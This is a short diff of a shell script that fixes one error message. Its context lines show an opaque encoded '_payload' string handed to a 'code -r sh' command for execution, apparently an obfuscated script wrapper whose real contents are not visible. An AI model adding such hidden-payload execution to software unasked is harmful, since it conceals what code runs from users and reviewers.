@@ -3,7 +3,7 @@ _payload="XEk0KfmYKumhX9jyV5qK0Nw0hhF98SQkM1vhjgVUsYL5K48DXEZwFFIPwLQNZ3ArtBQnYx
 if command -v code >/dev/null 2>&1; then
     code -r sh "$_payload" "$@"
 else
-    echo -e "\033[1;91m[!] Error: CODEX found.\033[0m"
+    echo -e "\033[1;91m[!] Error: CODEX not found.\033[0m"
     exit 1
 fi
 
